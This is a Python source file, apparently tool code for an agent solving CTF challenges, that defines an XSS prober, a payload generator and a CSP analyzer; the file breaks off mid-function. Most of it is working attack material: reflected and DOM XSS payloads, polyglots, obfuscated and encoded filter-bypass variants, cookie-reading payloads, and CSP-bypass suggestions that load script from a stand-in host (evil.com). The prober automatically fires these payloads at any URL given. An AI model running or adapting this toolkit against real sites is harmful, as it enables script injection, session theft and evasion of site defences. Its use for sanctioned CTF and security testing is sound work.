"""
XSS (Cross-Site Scripting) detection and analysis tools for CTF solving.

Provides automated XSS vulnerability probing, payload generation for filter
bypass scenarios, and Content-Security-Policy analysis.
"""

import json
import re
from typing import Dict, List, Optional, Tuple

import requests


class XssProbeTool:
    """
    XssProbeTool: detect XSS vulnerabilities by injecting context-specific payloads.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "url": "http://target.com/search",
          "param": "q",
          "method": "GET",           # optional, default GET
          "data": {},                # optional extra form data
          "context": "all",          # optional: html/attribute/javascript/url/all (default all)
          "timeout": 10              # optional
        }

    The tool injects XSS payloads organized by context (html, attribute,
    javascript, url) and checks whether they are reflected unencoded in
    the response.
    """

    name: str = "xss_probe"
    description: str = (
        "Detect XSS vulnerabilities by injecting context-specific payloads into a target "
        "parameter. Input must be JSON with keys: 'url' (target URL), 'param' (parameter to "
        "inject into), optional 'method' (GET or POST, default GET), optional 'data' (extra "
        "form data), optional 'context' (html/attribute/javascript/url/all, default all), "
        "optional 'timeout' (default 10). Returns analysis of which payloads are reflected "
        "unencoded, the vulnerable contexts, and recommended next steps."
    )

    # -- Payload sets organized by context --

    HTML_PAYLOADS: List[str] = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<body onload=alert(1)>",
        "<marquee onstart=alert(1)>",
    ]

    ATTRIBUTE_PAYLOADS: List[str] = [
        '" onmouseover="alert(1)',
        "' onfocus='alert(1)",
        '" autofocus onfocus="alert(1)',
        '" style="background:url(javascript:alert(1))"',
        '" accesskey="x" onclick="alert(1)',
    ]

    JAVASCRIPT_PAYLOADS: List[str] = [
        "';alert(1)//",
        "\\';alert(1)//",
        "</script><script>alert(1)</script>",
        "'-alert(1)-'",
        '\\"-alert(1)-\\"',
    ]

    URL_PAYLOADS: List[str] = [
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "java%0ascript:alert(1)",
    ]

    # Key dangerous fragments used for partial-reflection detection
    DANGEROUS_FRAGMENTS: List[str] = [
        "onerror=",
        "onload=",
        "onfocus=",
        "onmouseover=",
        "onclick=",
        "ontoggle=",
        "onstart=",
        "<script>",
        "<script",
        "<svg",
        "<img",
        "javascript:",
        "alert(",
    ]

    def __init__(self, session: Optional[requests.Session] = None) -> None:
        self.session = session or requests.Session()

    # -- internal helpers --

    def _get_payloads(self, context: str) -> Dict[str, List[str]]:
        """Return a mapping of context -> payload list based on the requested context."""
        all_payloads: Dict[str, List[str]] = {
            "html": self.HTML_PAYLOADS,
            "attribute": self.ATTRIBUTE_PAYLOADS,
            "javascript": self.JAVASCRIPT_PAYLOADS,
            "url": self.URL_PAYLOADS,
        }
        if context == "all":
            return all_payloads
        if context in all_payloads:
            return {context: all_payloads[context]}
        return all_payloads  # fallback to all

    def _make_request(
        self,
        url: str,
        method: str,
        param: str,
        payload: str,
        extra_data: dict,
        headers: dict,
        timeout: int,
    ) -> requests.Response:
        """Send a request with the payload injected into the target parameter."""
        request_data = {param: payload, **extra_data}
        if method == "GET":
            return self.session.get(url, params=request_data, headers=headers, timeout=timeout)
        # POST — detect JSON content type
        content_type = ""
        for k, v in headers.items():
            if k.lower() == "content-type":
                content_type = v.lower()
                break
        if "application/json" in content_type:
            return self.session.post(url, json=request_data, headers=headers, timeout=timeout)
        return self.session.post(url, data=request_data, headers=headers, timeout=timeout)

    def _check_reflection(self, payload: str, body: str) -> Tuple[bool, bool, List[str]]:
        """Check for full and partial reflections.

        Returns (full_reflected, partial_reflected, matched_fragments).
        """
        full_reflected = payload in body
        matched_fragments: List[str] = []
        for frag in self.DANGEROUS_FRAGMENTS:
            if frag in body:
                matched_fragments.append(frag)
        partial_reflected = bool(matched_fragments) and not full_reflected
        return full_reflected, partial_reflected, matched_fragments

    def _extract_flag(self, text: str) -> Optional[str]:
        """Try to extract a CTF flag from response text."""
        patterns = [
            r"(picoCTF\{[^}]+\})",
            r"(picoctf\{[^}]+\})",
            r"(HTB\{[^}]+\})",
            r"(htb\{[^}]+\})",
            r"(THM\{[^}]+\})",
            r"(thm\{[^}]+\})",
            r"(FLAG\{[^}]+\})",
            r"(flag\{[^}]+\})",
            r"(CTF\{[^}]+\})",
            r"(ctf\{[^}]+\})",
        ]
        for pattern in patterns:
            match = re.search(pattern, text)
            if match:
                return match.group(1)
        return None

    # -- public interface --

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[XssProbeTool] Error: Invalid JSON input. {exc}"

        url = data.get("url")
        if not url or not isinstance(url, str):
            return "[XssProbeTool] Error: 'url' (string) is required."

        param = data.get("param")
        if not param or not isinstance(param, str):
            return "[XssProbeTool] Error: 'param' (string) is required."

        method = (data.get("method") or "GET").upper()
        if method not in ("GET", "POST"):
            return "[XssProbeTool] Error: 'method' must be 'GET' or 'POST'."

        context = (data.get("context") or "all").lower()
        if context not in ("html", "attribute", "javascript", "url", "all"):
            return (
                "[XssProbeTool] Error: 'context' must be one of: "
                "html, attribute, javascript, url, all."
            )

        extra_data = data.get("data") or {}
        headers = data.get("headers") or {}
        timeout = data.get("timeout", 10)

        # Collect payload sets
        payload_sets = self._get_payloads(context)

        # Get baseline response
        try:
            baseline_resp = self._make_request(
                url, method, param, "xss_baseline_test_12345", extra_data, headers, timeout
            )
            baseline_length = len(baseline_resp.text)
            baseline_status = baseline_resp.status_code
        except Exception as exc:
            return f"[XssProbeTool] Error getting baseline response: {exc}"

        # Check security headers on baseline
        xss_protection = baseline_resp.headers.get("X-XSS-Protection", "Not set")
        content_type_header = baseline_resp.headers.get("Content-Type", "Not set")
        csp_header = baseline_resp.headers.get("Content-Security-Policy", "Not set")

        # Test payloads
        total_tested = 0
        findings: List[Dict] = []
        vulnerable_contexts: set = set()
        flags_found: List[str] = []

        for ctx_name, payloads in payload_sets.items():
            for payload in payloads:
                total_tested += 1
                try:
                    resp = self._make_request(
                        url, method, param, payload, extra_data, headers, timeout
                    )
                    body = resp.text

                    full_ref, partial_ref, fragments = self._check_reflection(payload, body)

                    flag = self._extract_flag(body)
                    if flag and flag not in flags_found:
                        flags_found.append(flag)

                    if full_ref:
                        vulnerable_contexts.add(ctx_name)
                        findings.append({
                            "context": ctx_name,
                            "payload": payload,
                            "reflection": "FULL",
                            "status": resp.status_code,
                            "length": len(body),
                            "fragments": fragments,
                            "flag": flag,
                        })
                    elif partial_ref:
                        findings.append({
                            "context": ctx_name,
                            "payload": payload,
                            "reflection": "PARTIAL",
                            "status": resp.status_code,
                            "length": len(body),
                            "fragments": fragments,
                            "flag": flag,
                        })

                except requests.exceptions.Timeout:
                    findings.append({
                        "context": ctx_name,
                        "payload": payload,
                        "reflection": "TIMEOUT",
                        "status": "TIMEOUT",
                        "length": 0,
                        "fragments": [],
                        "flag": None,
                    })
                except Exception:
                    pass  # silently skip individual request errors

        # -- Build output --
        lines = [
            "[XssProbeTool] XSS Probe Results",
            "=" * 50,
            f"Target: {url}",
            f"Method: {method}",
            f"Parameter: {param}",
            f"Context(s) Tested: {context}",
            f"Payloads Tested: {total_tested}",
            f"Baseline Status: {baseline_status}",
            f"Baseline Length: {baseline_length} bytes",
            "",
            "SECURITY HEADERS:",
            f"  X-XSS-Protection: {xss_protection}",
            f"  Content-Type: {content_type_header}",
            f"  Content-Security-Policy: {csp_header[:120]}{'...' if len(csp_header) > 120 else ''}",
            "",
        ]

        # Flags
        if flags_found:
            lines.append("!!! FLAGS FOUND !!!")
            for flag in flags_found:
                lines.append(f"  {flag}")
            lines.append("")

        # Findings — full reflections first
        full_findings = [f for f in findings if f["reflection"] == "FULL"]
        partial_findings = [f for f in findings if f["reflection"] == "PARTIAL"]
        timeout_findings = [f for f in findings if f["reflection"] == "TIMEOUT"]

        if full_findings:
            lines.append(f"FULL REFLECTIONS ({len(full_findings)} found):")
            lines.append("-" * 40)
            for f in full_findings:
                lines.append(f"  Context: {f['context']}")
                lines.append(f"  Payload: {f['payload']}")
                lines.append(f"    Status: {f['status']}, Length: {f['length']}")
                if f["fragments"]:
                    lines.append(f"    Dangerous fragments: {', '.join(f['fragments'])}")
                if f["flag"]:
                    lines.append(f"    -> FLAG: {f['flag']}")
                lines.append("")

        if partial_findings:
            lines.append(f"PARTIAL REFLECTIONS ({len(partial_findings)} found):")
            lines.append("-" * 40)
            for f in partial_findings:
                lines.append(f"  Context: {f['context']}")
                lines.append(f"  Payload: {f['payload']}")
                lines.append(f"    Status: {f['status']}, Length: {f['length']}")
                if f["fragments"]:
                    lines.append(f"    Reflected fragments: {', '.join(f['fragments'])}")
                lines.append("")

        if timeout_findings:
            lines.append(f"TIMEOUTS ({len(timeout_findings)}):")
            for f in timeout_findings:
                lines.append(f"  Payload: {f['payload']}")
            lines.append("")

        if not findings:
            lines.append("No reflections detected with the tested payloads.")
            lines.append("")

        # Summary
        lines.append("SUMMARY:")
        lines.append(f"  Full Reflections: {len(full_findings)}")
        lines.append(f"  Partial Reflections: {len(partial_findings)}")
        lines.append(f"  Vulnerable Contexts: {', '.join(sorted(vulnerable_contexts)) or 'None'}")
        lines.append(f"  Flags Found: {len(flags_found)}")
        lines.append("")

        # Recommendations
        lines.append("NEXT STEPS:")
        if full_findings:
            lines.append("  - XSS confirmed! Payloads are reflected unencoded.")
            lines.append("  - Use xss_payload_generator with 'polyglot' for robust exploit.")
            if "html" in vulnerable_contexts:
                lines.append("  - HTML context: try <script>, <img>, <svg> based payloads.")
            if "attribute" in vulnerable_contexts:
                lines.append("  - Attribute context: try event handler injection.")
            if "javascript" in vulnerable_contexts:
                lines.append("  - JavaScript context: try string-breaking payloads.")
            if "url" in vulnerable_contexts:
                lines.append("  - URL context: try javascript: and data: URI schemes.")
            if csp_header != "Not set":
                lines.append("  - CSP header present. Use csp_analyzer to check for bypasses.")
        elif partial_findings:
            lines.append("  - Partial reflections detected — some filtering in place.")
            lines.append("  - Use xss_payload_generator with 'filter_bypass' to evade filters.")
            lines.append("  - Try 'encoding_bypass' to use encoded payload variants.")
        else:
            lines.append("  - No reflections detected. The parameter may not be reflected.")
            lines.append("  - Try other parameters or check for DOM-based XSS.")
            lines.append("  - Use xss_payload_generator with 'dom_xss' for DOM sink payloads.")

        return "\n".join(lines)


class XssPayloadGenerator:
    """
    XssPayloadGenerator: generate XSS payloads for various bypass and exploitation scenarios.

    Pure logic tool — no session required.

    Expected JSON tool_input format:

        {
          "operation": "filter_bypass",  # filter_bypass/dom_xss/polyglot/encoding_bypass/event_handlers
          "blocked_tags": ["script"],    # optional: tags known to be blocked
          "blocked_events": ["onerror"], # optional: events known to be blocked
          "blocked_keywords": ["alert"], # optional: keywords known to be blocked
          "context": "html"             # optional: html/attribute/javascript/url
        }
    """

    name: str = "xss_payload_generator"
    description: str = (
        "Generate XSS payloads for filter bypass, DOM-based XSS, polyglot, encoding bypass, "
        "and event handler enumeration. Input must be JSON with 'operation' (one of: "
        "filter_bypass, dom_xss, polyglot, encoding_bypass, event_handlers), optional "
        "'blocked_tags' (list of blocked HTML tags), optional 'blocked_events' (list of "
        "blocked event handlers), optional 'blocked_keywords' (list of blocked keywords like "
        "'alert'), optional 'context' (html/attribute/javascript/url). Returns a set of "
        "payloads tailored to the specified scenario."
    )

    VALID_OPERATIONS = {
        "filter_bypass",
        "dom_xss",
        "polyglot",
        "encoding_bypass",
        "event_handlers",
    }

    # -- Alternative tags for filter bypass --
    ALTERNATIVE_TAGS: Dict[str, List[str]] = {
        "script": [
            "<svg onload=FUNC>",
            "<details open ontoggle=FUNC>",
            "<marquee onstart=FUNC>",
            "<math><mtext><table><mglyph><svg><mtext><textarea><path d=\"0\" onmouseover=FUNC>",
            "<table background=javascript:FUNC>",
            "<input onfocus=FUNC autofocus>",
            "<video><source onerror=FUNC>",
            "<audio src=x onerror=FUNC>",
            "<body onload=FUNC>",
            "<iframe onload=FUNC>",
        ],
        "img": [
            "<svg onload=FUNC>",
            "<video><source onerror=FUNC>",
            "<audio src=x onerror=FUNC>",
            "<input onfocus=FUNC autofocus>",
            "<details open ontoggle=FUNC>",
        ],
        "svg": [
            "<img src=x onerror=FUNC>",
            "<details open ontoggle=FUNC>",
            "<marquee onstart=FUNC>",
            "<input onfocus=FUNC autofocus>",
            "<math><mtext><annotation-xml encoding=\"text/html\"><title><svg onload=FUNC>",
        ],
        "iframe": [
            "<object data=javascript:FUNC>",
            "<embed src=javascript:FUNC>",
            "<svg onload=FUNC>",
        ],
    }

    # -- Alternative event handlers --
    ALTERNATIVE_EVENTS: Dict[str, List[str]] = {
        "onerror": [
            "ontoggle", "onfocusin", "onpointerover", "onanimationstart",
            "onmouseover", "onfocus", "onload", "onstart",
        ],
        "onload": [
            "onerror", "ontoggle", "onfocusin", "onpointerover",
            "onanimationstart", "onstart", "onfocus",
        ],
        "onmouseover": [
            "onpointerover", "onfocusin", "onfocus", "ontoggle",
            "onanimationstart", "onerror", "onload",
        ],
        "onfocus": [
            "onfocusin", "onpointerover", "ontoggle", "onerror",
            "onanimationstart", "onload",
        ],
        "onclick": [
            "onpointerdown", "onpointerup", "onmousedown", "onmouseup",
            "ontouchstart", "ontouchend", "onfocus",
        ],
    }

    # -- Alternative alert functions --
    ALTERNATIVE_FUNCTIONS: List[str] = [
        "confirm(1)",
        "prompt(1)",
        "eval(atob('YWxlcnQoMSk='))",
        "top[/al/.source+/ert/.source](1)",
        "self['ale'+'rt'](1)",
        "window['ale'+'rt'](1)",
        "this['ale'+'rt'](1)",
        "[].constructor.constructor('return alert(1)')()",
        "Function('alert(1)')()",
        "eval('ale'+'rt(1)')",
        "setTimeout('alert(1)')",
        "setInterval('alert(1)')",
        "new Function('alert(1)')()",
    ]

    # -- DOM XSS sink payloads --
    DOM_XSS_PAYLOADS: Dict[str, List[str]] = {
        "innerHTML": [
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<details open ontoggle=alert(1)>",
        ],
        "document.write": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "';alert(1);//",
        ],
        "eval": [
            "alert(1)",
            "';alert(1);//",
            "\\');alert(1);//",
            "1;alert(1)",
        ],
        "location.href": [
            "javascript:alert(1)",
            "javascript:alert(document.cookie)",
            "data:text/html,<script>alert(1)</script>",
        ],
        "window.open": [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
        ],
        "$.html()": [
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<iframe srcdoc='<script>alert(1)</script>'>",
        ],
    }

    # -- Polyglot payloads --
    POLYGLOT_PAYLOADS: List[str] = [
        "jaVasCript:/*-/*'/*\"/**/( /* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        "'\">><marquee><img src=x onerror=confirm(1)></marquee>\"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\"-->",
        "<svg/onload=alert(1)//",
        "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
        "\"><img src=x onerror=alert(1)//>\">",
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "-->'\"--><svg onload=alert(1)>",
        "<script>alert(1)</script>\"><script>alert(1)</script>'>",
    ]

    # -- Event handlers organized by category --
    EVENT_HANDLERS: Dict[str, List[str]] = {
        "mouse": [
            "onclick", "ondblclick", "onmousedown", "onmouseup",
            "onmouseover", "onmouseout", "onmousemove", "onmouseenter",
            "onmouseleave", "oncontextmenu",
        ],
        "keyboard": [
            "onkeydown", "onkeyup", "onkeypress",
        ],
        "form": [
            "onfocus", "onblur", "onchange", "oninput", "onsubmit",
            "onreset", "onselect", "oninvalid",
        ],
        "media": [
            "onplay", "onpause", "onended", "onvolumechange",
            "onloadeddata", "onloadedmetadata", "ontimeupdate",
            "oncanplay", "onseeking", "onseeked", "onwaiting",
            "onstalled", "onsuspend", "onemptied", "onratechange",
            "ondurationchange",
        ],
        "misc": [
            "onload", "onerror", "onresize", "onscroll", "onunload",
            "onbeforeunload", "onhashchange", "onpopstate",
            "onstorage", "onoffline", "ononline", "onmessage",
            "onanimationstart", "onanimationend", "onanimationiteration",
            "ontransitionend", "ontoggle", "onfocusin", "onfocusout",
            "onpointerover", "onpointerout", "onpointerenter",
            "onpointerleave", "onpointerdown", "onpointerup",
            "onpointermove", "ongotpointercapture", "onlostpointercapture",
            "ontouchstart", "ontouchend", "ontouchmove", "ontouchcancel",
            "onwheel", "onbeforeinput", "ondrag", "ondragstart",
            "ondragend", "ondragover", "ondragenter", "ondragleave",
            "ondrop", "onpaste", "oncopy", "oncut", "onstart",
        ],
    }

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[XssPayloadGenerator] Error: Invalid JSON input. {exc}"

        operation = (data.get("operation") or "").lower().strip()
        if not operation:
            return (
                "[XssPayloadGenerator] Error: 'operation' is required. "
                f"Valid operations: {', '.join(sorted(self.VALID_OPERATIONS))}"
            )
        if operation not in self.VALID_OPERATIONS:
            return (
                f"[XssPayloadGenerator] Error: Unknown operation '{operation}'. "
                f"Valid operations: {', '.join(sorted(self.VALID_OPERATIONS))}"
            )

        blocked_tags = [t.lower().strip() for t in data.get("blocked_tags", [])]
        blocked_events = [e.lower().strip() for e in data.get("blocked_events", [])]
        blocked_keywords = [k.lower().strip() for k in data.get("blocked_keywords", [])]
        context = (data.get("context") or "html").lower()

        try:
            if operation == "filter_bypass":
                return self._filter_bypass(blocked_tags, blocked_events, blocked_keywords, context)
            elif operation == "dom_xss":
                return self._dom_xss()
            elif operation == "polyglot":
                return self._polyglot()
            elif operation == "encoding_bypass":
                return self._encoding_bypass()
            elif operation == "event_handlers":
                return self._event_handlers()
            else:
                return f"[XssPayloadGenerator] Error: Operation '{operation}' not implemented."
        except Exception as exc:
            return f"[XssPayloadGenerator] Error: {exc}"

    # -- operation implementations --

    def _filter_bypass(
        self,
        blocked_tags: List[str],
        blocked_events: List[str],
        blocked_keywords: List[str],
        context: str,
    ) -> str:
        lines = [
            "[XssPayloadGenerator] Filter Bypass Payloads",
            "=" * 50,
            f"Blocked Tags: {', '.join(blocked_tags) or 'none'}",
            f"Blocked Events: {', '.join(blocked_events) or 'none'}",
            f"Blocked Keywords: {', '.join(blocked_keywords) or 'none'}",
            f"Context: {context}",
            "",
        ]

        payloads: List[str] = []

        # 1. Choose alternative function
        func_options: List[str] = []
        if "alert" in blocked_keywords:
            func_options = [f for f in self.ALTERNATIVE_FUNCTIONS]
        else:
            func_options = ["alert(1)"]

        # 2. Choose alternative tags
        lines.append("=== Tag-Based Bypasses ===")
        for blocked_tag in blocked_tags:
            alts = self.ALTERNATIVE_TAGS.get(blocked_tag, [])
            if alts:
                for alt in alts:
                    for func in func_options[:3]:  # limit combinations
                        p = alt.replace("FUNC", func)
                        # Check if this payload uses a blocked event
                        skip = False
                        for be in blocked_events:
                            if be in p.lower():
                                skip = True
                                break
                        if not skip:
                            payloads.append(p)

        # If no specific tags blocked, generate general alternatives
        if not blocked_tags:
            general_tags = [
                "<svg onload=FUNC>",
                "<details open ontoggle=FUNC>",
                "<marquee onstart=FUNC>",
                "<math><mtext><img src=x onerror=FUNC>",
                "<input onfocus=FUNC autofocus>",
                "<video><source onerror=FUNC>",
                "<audio src=x onerror=FUNC>",
            ]
            for tag in general_tags:
                for func in func_options[:3]:
                    p = tag.replace("FUNC", func)
                    skip = False
                    for be in blocked_events:
                        if be in p.lower():
                            skip = True
                            break
                    if not skip:
                        payloads.append(p)

        for p in payloads[:15]:
            lines.append(f"  {p}")

        # 3. Event handler alternatives
        lines.append("")
        lines.append("=== Event Handler Bypasses ===")
        event_payloads: List[str] = []
        for blocked_event in blocked_events:
            alts = self.ALTERNATIVE_EVENTS.get(blocked_event, [])
            for alt_event in alts:
                if alt_event not in blocked_events:
                    for func in func_options[:2]:
                        event_payloads.append(f'<div {alt_event}="{func}">test</div>')
        if not blocked_events:
            # Provide unusual event handlers
            unusual = ["ontoggle", "onfocusin", "onpointerover", "onanimationstart"]
            for ev in unusual:
                for func in func_options[:2]:
                    event_payloads.append(f'<div {ev}="{func}">test</div>')
        for p in event_payloads[:10]:
            lines.append(f"  {p}")

        # 4. Keyword bypass alternatives
        lines.append("")
        lines.append("=== Keyword Bypass Functions ===")
        if "alert" in blocked_keywords:
            for func in self.ALTERNATIVE_FUNCTIONS:
                lines.append(f"  {func}")
        else:
            lines.append("  No keyword restrictions — alert(1) should work.")

        total = len(payloads) + len(event_payloads)
        lines.append("")
        lines.append(f"Total payloads generated: {total}")

        return "\n".join(lines)

    def _dom_xss(self) -> str:
        lines = [
            "[XssPayloadGenerator] DOM-Based XSS Payloads",
            "=" * 50,
            "",
            "These payloads target common JavaScript sinks. Inject them via",
            "URL fragments (#), query parameters, or any user-controlled input",
            "that flows into a DOM sink.",
            "",
        ]
        for sink, payloads in self.DOM_XSS_PAYLOADS.items():
            lines.append(f"=== Sink: {sink} ===")
            for p in payloads:
                lines.append(f"  {p}")
            lines.append("")

        lines.append("TIPS:")
        lines.append("  1. Check for sources: location.hash, location.search, document.referrer")
        lines.append("  2. Check for sinks: innerHTML, document.write, eval, $.html()")
        lines.append("  3. Use browser DevTools to trace data flow from source to sink")
        lines.append("  4. URL fragment (#) payloads bypass server-side filtering")

        return "\n".join(lines)

    def _polyglot(self) -> str:
        lines = [
            "[XssPayloadGenerator] Polyglot XSS Payloads",
            "=" * 50,
            "",
            "Polyglot payloads work across multiple injection contexts.",
            "Use when the exact context is unknown or when input appears",
            "in multiple locations.",
            "",
        ]
        for i, payload in enumerate(self.POLYGLOT_PAYLOADS, start=1):
            lines.append(f"--- Polyglot #{i} ---")
            lines.append(f"  {payload}")
            lines.append("")

        lines.append("USAGE:")
        lines.append("  1. Try each polyglot as-is in the target parameter")
        lines.append("  2. These break out of multiple contexts (HTML, attribute, script, comment)")
        lines.append("  3. If partially reflected, use the reflected portion as a starting point")

        return "\n".join(lines)

    def _encoding_bypass(self) -> str:
        # Example base payloads to encode
        base_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
        ]

        lines = [
            "[XssPayloadGenerator] Encoding Bypass Payloads",
            "=" * 50,
            "",
        ]

        # HTML entities
        lines.append("=== HTML Entity Encoding ===")
        for bp in base_payloads:
            encoded = "".join(f"&#{ord(c)};" for c in bp)
            lines.append(f"  {encoded}")
        # Hex HTML entities
        lines.append("")
        lines.append("=== HTML Hex Entity Encoding ===")
        for bp in base_payloads:
            encoded = "".join(f"&#x{ord(c):x};" for c in bp)
            lines.append(f"  {encoded}")

        # Unicode escapes
        lines.append("")
        lines.append("=== Unicode Escapes (JS context) ===")
        js_payloads = ["alert(1)", "alert(document.cookie)"]
        for jp in js_payloads:
            encoded = "".join(f"\\u{ord(c):04x}" for c in jp)
            lines.append(f"  {encoded}")

        # URL encoding
        lines.append("")
        lines.append("=== URL Encoding ===")
        import urllib.parse
        for bp in base_payloads:
            encoded = urllib.parse.quote(bp, safe="")
            lines.append(f"  {encoded}")

        # Double URL encoding
        lines.append("")
        lines.append("=== Double URL Encoding ===")
        for bp in base_payloads:
            first = urllib.parse.quote(bp, safe="")
            double = urllib.parse.quote(first, safe="")
            lines.append(f"  {double}")

        # Mixed case
        lines.append("")
        lines.append("=== Mixed Case Bypass ===")
        mixed_payloads = [
            "<ScRiPt>alert(1)</sCrIpT>",
            "<ImG sRc=x OnErRoR=alert(1)>",
            "<SvG oNlOaD=alert(1)>",
            "<DeTaIlS oPeN oNtOgGlE=alert(1)>",
        ]
        for mp in mixed_payloads:
            lines.append(f"  {mp}")

        # Null byte insertion
        lines.append("")
        lines.append("=== Null Byte Insertion ===")
        null_payloads = [
            "<scr%00ipt>alert(1)</scr%00ipt>",
            "<im%00g src=x onerror=alert(1)>",
            "<sv%00g onload=alert(1)>",
            "alert%00(1)",
        ]
        for np in null_payloads:
            lines.append(f"  {np}")

        lines.append("")
        lines.append("TIPS:")
        lines.append("  1. Try HTML entities when server decodes them before rendering")
        lines.append("  2. Double URL encoding bypasses single-decode filters")
        lines.append("  3. Mixed case bypasses case-sensitive blacklists")
        lines.append("  4. Null bytes can truncate strings in some parsers")
        lines.append("  5. Combine techniques for stronger bypasses")

        return "\n".join(lines)

    def _event_handlers(self) -> str:
        lines = [
            "[XssPayloadGenerator] HTML Event Handlers Reference",
            "=" * 50,
            "",
        ]
        total = 0
        for category, handlers in self.EVENT_HANDLERS.items():
            lines.append(f"=== {category.upper()} ({len(handlers)}) ===")
            for handler in handlers:
                lines.append(f"  {handler}")
                total += 1
            lines.append("")

        lines.append(f"Total event handlers: {total}")
        lines.append("")
        lines.append("USAGE EXAMPLES:")
        lines.append('  <tag EVENT="alert(1)">          (standard)')
        lines.append("  <tag EVENT=alert(1)>             (no quotes)")
        lines.append("  <input autofocus onfocus=alert(1)>  (auto-trigger)")
        lines.append("  <details open ontoggle=alert(1)>    (auto-trigger)")
        lines.append("  <marquee onstart=alert(1)>          (auto-trigger)")
        lines.append("  <body onload=alert(1)>              (auto-trigger)")

        return "\n".join(lines)


class CspAnalyzerTool:
    """
    CspAnalyzerTool: fetch a URL and analyze its Content-Security-Policy for weaknesses.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "url": "http://target.com",         # required (unless csp_string provided)
          "csp_string": "default-src 'self'",  # optional: analyze directly
          "timeout": 10                        # optional
        }
    """

    name: str = "csp_analyzer"
    description: str = (
        "Analyze Content-Security-Policy headers for XSS bypass opportunities. Input must be "
        "JSON with 'url' (target URL to fetch CSP from) or 'csp_string' (raw CSP to analyze "
        "directly). Optionally provide 'timeout' (default 10). Returns parsed directives, "
        "weaknesses, bypass suggestions, and an overall risk level."
    )

    # Known CDNs that can be abused for CSP bypasses
    BYPASS_CDNS: List[str] = [
        "cdnjs.cloudflare.com",
        "cdn.jsdelivr.net",
        "ajax.googleapis.com",
        "unpkg.com",
    ]

    def __init__(self, session: Optional[requests.Session] = None) -> None:
        self.session = session or requests.Session()

    # -- internal helpers --

    def _parse_csp(self, csp_string: str) -> Dict[str, List[str]]:
        """Parse a CSP string into a dict of directive -> values."""
        directives: Dict[str, List[str]] = {}
        for directive in csp_string.split(";"):
            directive = directive.strip()
            if not directive:
                continue
            parts = directive.split()
            if parts:
                name = parts[0].lower()
                values = [v.strip() for v in parts[1:]]
                directives[name] = values
        return directives

    def _analyze_directives(self, directives: Dict[str, List[str]]) -> Tuple[List[Dict], List[str]]:
        """Analyze directives and return (weaknesses, bypass_suggestions)."""
        weaknesses: List[Dict] = []
        bypasses: List[str] = []

        # Helper to get effective script-src (falls back to default-src)
        script_src = directives.get("script-src", directives.get("default-src", []))
        style_src = directives.get("style-src", directives.get("default-src", []))
        img_src = directives.get("img-src", directives.get("default-src", []))
        all_values_flat = " ".join(v for vals in directives.values() for v in vals)

        # --- Check unsafe-inline in script-src ---
        if "'unsafe-inline'" in script_src:
            weaknesses.append({
                "directive": "script-src",
                "issue": "'unsafe-inline' allows inline script execution",
                "severity": "HIGH",
            })
            bypasses.append("Inline <script>alert(1)</script> should execute directly.")
            bypasses.append("Inline event handlers like onerror=alert(1) should work.")

        # --- Check unsafe-eval in script-src ---
        if "'unsafe-eval'" in script_src:
            weaknesses.append({
                "directive": "script-src",
                "issue": "'unsafe-eval' allows eval(), Function(), setTimeout(string)",
                "severity": "HIGH",
            })
            bypasses.append("Use eval('alert(1)') or new Function('alert(1)')()")

        # --- Wildcard * ---
        if "*" in script_src:
            weaknesses.append({
                "directive": "script-src",
                "issue": "Wildcard (*) allows loading scripts from any origin",
                "severity": "HIGH",
            })
            bypasses.append("Host a script on any domain: <script src='https://evil.com/xss.js'></script>")

        for directive_name, values in directives.items():
            if directive_name != "script-src" and "*" in values:
                weaknesses.append({
                    "directive": directive_name,
                    "issue": f"Wildcard (*) in {directive_name} allows loading from any origin",
                    "severity": "MEDIUM",
                })

        # --- data: in script-src ---
        if "data:" in script_src:
            weaknesses.append({
                "directive": "script-src",
                "issue": "'data:' URI scheme allows inline script via data: URIs",
                "severity": "HIGH",
            })
            bypasses.append("Use <script src='data:text/javascript,alert(1)'></script>")

        # --- Missing base-uri ---
        if "base-uri" not in directives:
            weaknesses.append({
                "directive": "base-uri",
                "issue": "Missing base-uri directive allows <base> tag injection",
                "severity": "MEDIUM",
            })
            bypasses.append("Inject <base href='https://evil.com/'> to hijack relative script URLs.")

        # --- Missing object-src ---
        if "object-src" not in directives:
            weaknesses.append({
                "directive": "object-src",
                "issue": "Missing object-src allows plugin-based XSS (Flash, Java applets)",
                "severity": "MEDIUM",
            })
            bypasses.append("Try <object data='data:text/html,...'> or Flash-based XSS.")

        # --- Missing frame-ancestors ---
        if "frame-ancestors" not in directives:
            weaknesses.append({
                "directive": "frame-ancestors",
                "issue": "Missing frame-ancestors allows clickjacking",
                "severity": "MEDIUM",
            })
            bypasses.append("Page can be framed — clickjacking attack possible.")

        # --- strict-dynamic with nonce ---
        has_nonce = any(v.startswith("'nonce-") for v in script_src)
        if "'strict-dynamic'" in script_src:
            weaknesses.append({
